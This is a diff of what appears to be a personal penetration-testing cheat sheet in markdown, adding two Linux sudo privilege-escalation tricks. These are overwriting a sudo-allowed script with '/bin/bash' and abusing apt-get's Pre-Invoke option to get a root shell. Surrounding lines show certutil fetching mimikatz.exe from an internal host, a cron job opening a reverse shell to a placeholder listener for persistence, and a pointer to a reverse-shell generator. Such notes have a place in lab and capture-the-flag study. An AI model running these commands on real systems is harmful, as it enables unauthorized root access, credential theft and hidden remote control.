@@ -82,6 +82,8 @@ certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
 - use **who** to see which use has logged in remotely.
 - use **lastlog** see who has last logged in remotely.
 - **sudo -l** is a command used to list the sudo privileges for the current user on a Linux system. It tells you what commands you can run with sudo, whether you need a password, and under which user you can execute them.
+- if sudo -l returns a bash script that can be used by the role u have, just **echo '/bin/bash' > <script>** to get root access
+- if sudo -l returns an apt binary, use **sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash**
 - use https://github.com/itm4n/PrivescCheck powershell script for privilege escalation in windows.
 - use the following for linux persistence through cron: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
 - After getting a reverse shell through .php, .c, .py or .exe files, use [revshells.com](https://www.revshells.com/) to get a reverse shell to get a netcat shell on the attacker machine. This increases the extent of accessibility.
